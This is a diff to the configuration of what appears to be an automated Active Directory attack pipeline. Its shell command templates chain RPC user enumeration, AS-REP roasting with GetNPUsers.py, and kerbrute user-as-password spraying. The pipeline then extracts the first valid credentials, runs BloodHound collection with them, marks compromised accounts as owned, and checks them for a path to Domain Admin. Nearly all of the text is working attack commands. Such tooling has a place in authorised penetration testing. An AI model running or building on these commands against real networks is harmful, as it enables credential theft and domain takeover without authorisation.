@@ -99,7 +99,7 @@ cat {output_dir}rpc_users.lst;
 && echo 'USERS FOUND'"""
 
   [[rpc-list-users.append_array]]
-  usernames = "^((?!USERS FOUND).*)$" 
+  usernames = "^(?!USERS FOUND|RESULT WAS NT_STATUS_ACCESS_DENIED)(.*)$" 
 
   [[rpc-list-users.patterns]]
   "USERS FOUND" = [
@@ -108,7 +108,20 @@ cat {output_dir}rpc_users.lst;
 
 [asreproast]
 name = "asreproast"
-cmd = """GetNPUsers.py {domain_name}/ -usersfile {users_file} -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; 
+cmd = """
+lockfile-create --lock-name {output_dir}asreproast.lock;
+python3 -c "a={usernames}; print('\\n'.join(x.split('@')[0] for x in a))" > {output_dir}asrep_users.tmp \
+&& sort -u {output_dir}asrep_users.tmp -f {output_dir}asrep_users.tmp;
+if [ -s {output_dir}asrep_users_validated.tmp ]; then \
+diff {output_dir}asrep_users.tmp {output_dir}asrep_users_validated.tmp \
+| grep "<" | sed -e 's/< //' > {output_dir}asrep_users_to_validate.tmp;
+else
+touch {output_dir}asrep_users_validated.tmp;
+mv {output_dir}asrep_users.tmp {output_dir}asrep_users_to_validate.tmp; 
+fi
+cat {output_dir}asrep_users_to_validate.tmp >> {output_dir}asrep_users_validated.tmp;
+GetNPUsers.py {domain_name}/ -usersfile {output_dir}asrep_users_to_validate.tmp -no-pass -dc-ip {ip} -outputfile {output_dir}asreproast.hash; 
+lockfile-remove --lock-name {output_dir}asreproast.lock;
 [ -s {output_dir}asreproast.hash ] && echo 'TGT FOUND'"""
 
   [[asreproast.store_static]]
@@ -181,35 +194,42 @@ cat {output_dir}usernames_to_validate.tmp >> {output_dir}usernames_validated.tmp
 lockfile-remove --lock-name {output_dir}kerbrute.lock;"""
 
   [[kerbrute-test-user-as-pass.append_array]]
-  "credentials" = '''\[\+\] VALID USERNAME:\s*(.*)\x1b'''
+  "credentials" = '''\[\+\] VALID LOGIN:\s*(.*)\x1b'''
 
   [[kerbrute-test-user-as-pass.patterns]]
-  "VALID CREDENTIALS" = [
+  "VALID LOGIN" = [
     "VALID CREDENTIALS FOUND"
   ]
 
+[first-valid-creds]
+name = "first-valid-creds"
+cmd = '''python3 -c "a={credentials}; u,p=a[0].split(':'); print(f'USERNAME: {{u}}'); print(f'PASSWORD: {{p}}')";'''
+
+  [[first-valid-creds.store]]
+  user_default = '''^USERNAME: (.*?)$'''
+
+  [[first-valid-creds.store]]
+  password_default = '''^PASSWORD: (.*?)$'''
+
 [bloodhound-gather-info]
 name = "bloodhound-gather-info"
-cmd = "bloodhound-python -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -gc {ip} -c all"
+cmd = "cd {output_dir}; mkdir -p bloodhound; cd bloodhound; bloodhound-python -u {user_default} -p {password_default} -d {domain_name} -dc {dc_dns} -ns {ip} -c all"
+run_once = true
 
   [[bloodhound-gather-info.store]]
-  bloodhound_gathered = "(Done)$"
+  bloodhound_gathered = "INFO: Done"
 
   [[bloodhound-gather-info.patterns]]
-  "Done$" = [
+  "INFO: Done" = [
     "BLOODHOUND GATHERED"
   ]
 
 [bloodhound-add-owned-users]
 name = "bloodhound-add-owned-users"
-cmd = """if [[ {bloodhound_gathered} == 'Done' ]]; 
-then
-    lockfile-create --lock-name {output_dir}owned_users.lock;
-    python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d':' -f1  > {output_dir}owned_users.lst \
-    && sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
-    python3 ~/programs/bloodhound/mark_as_owned.py -l {output_dir}owned_users.lst -d {domain_name};
-    lockfile-remove --lock-name {output_dir}owned_users.lst;
-fi"""
+cmd = """python3 -c "a={credentials}; print('\\n'.join(a))" | cut -d'@' -f1  > {output_dir}owned_users.lst \
+&& sort -u {output_dir}owned_users.lst -f {output_dir}owned_users.lst;
+python3 ~/programs/bloodhound/mark_as_owned.py -l {output_dir}owned_users.lst -d {domain_name};"""
+iterate_over = "credentials"
 
   [[bloodhound-add-owned-users.patterns]]
   "Done$" = [
@@ -227,9 +247,23 @@ cmd = ""
 
 [bloodhound-check-shortest-path]
 name = "bloodhound-check-shortest-path"
-cmd = ""
+cmd = "python3 ~/programs/bloodhound/check_path_to_da.py -u $(echo '{array_element}' | cut -d':' -f1)"
+iterate_over = "credentials"
 
   [[bloodhound-check-shortest-path.patterns]]
-  "" = [
+  "\[\+\] Path to DA found for user " = [
     "PATH TO DA FOUND"
-  ] 
+  ]
+
+[manual-user-add]
+name = "manual-user-add"
+file = "{output_dir}credentials.lst"
+listener = true
+
+  [[manual-user-add.append_array]]
+  "credentials" = '(.*)'
+
+  [[manual-user-add.patterns]]
+  "(.*)" = [
+    "VALID CREDENTIALS FOUND"
+  ]
